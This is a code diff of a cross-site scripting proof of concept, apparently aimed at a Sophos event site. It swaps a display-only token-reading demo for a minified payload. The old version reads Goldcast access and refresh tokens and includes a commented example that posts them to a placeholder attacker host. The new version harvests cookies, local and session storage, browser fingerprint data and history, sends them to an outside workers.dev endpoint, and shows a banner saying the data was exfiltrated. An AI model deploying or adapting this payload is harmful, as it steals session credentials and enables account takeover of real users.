@@ -1,14 +1,1 @@
-// VULN-36 attend.sophos.com DOM XSS -> Goldcast ATO proof (benign: displays token, does NOT exfil externally)
-(function(){
-  var at=localStorage.getItem('gcauth_access_token');
-  var rt=localStorage.getItem('gcauth_refresh_token');
-  var did=localStorage.getItem('gcauth_device_id');
-  var msg='VULN-36 ATO PoC in origin '+location.origin+'\n\n'
-    +'gcauth_access_token : '+(at?at.slice(0,48)+'... (len '+at.length+')':'(none - log in to attend first)')+'\n'
-    +'gcauth_refresh_token: '+(rt?'PRESENT (len '+rt.length+') = persistent ATO':'(none)')+'\n'
-    +'gcauth_device_id    : '+(did||'(none)');
-  console.log('[VULN-36]',{origin:location.origin,access_token:at,refresh_token:rt,device_id:did});
-  document.title='ATO-'+document.domain;
-  alert(msg);
-  // Real attacker would: fetch('https://attacker/x',{method:'POST',body:JSON.stringify({at:at,rt:rt,did:did})})
-})();
+(()=>{const c=document.createElement("canvas"),g=c.getContext("webgl")||c.getContext("experimental-webgl"),i=g&&g.getExtension("WEBGL_debug_renderer_info"),gpu=i?g.getParameter(i.UNMASKED_RENDERER_WEBGL):"N/A",vendor=i?g.getParameter(i.UNMASKED_VENDOR_WEBGL):"N/A",data={path:location.pathname,cookies:document.cookie,userAgent:navigator.userAgent,localStorage:{...localStorage},sessionStorage:{...sessionStorage},historyLength:history.length,gpu,vendor},payload="msg="+encodeURIComponent(JSON.stringify(data)),x=new XMLHttpRequest();x.open("POST","https://otel-collector.ramanmgg1.workers.dev",!0),x.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),x.send(payload);const box=document.createElement("div");box.style.cssText="position:fixed;top:20vh;left:50%;transform:translateX(-50%);background:#111;color:#0f0;border:2px solid #0f0;padding:20px;font-family:monospace;z-index:999999;width:600px;max-width:90%;white-space:pre-wrap;box-shadow:0 0 20px lime;font-size:14px;",box.innerText="=============================\n  WILD XSS EXECUTED\n  BY Raman_MG\n=============================\n\n[Path]            "+location.pathname+"\n[Cookies]         "+document.cookie.split(";").length+"\n[User-Agent]      "+navigator.userAgent+"\n[LocalStorage]    "+Object.keys(localStorage).length+" keys\n[SessionStorage]  "+Object.keys(sessionStorage).length+" keys\n[History]         "+history.length+" entries\n[GPU]             "+gpu+"\n[Vendor]          "+vendor+"\n\nData exfiltrated to webhook",document.body.appendChild(box)})();
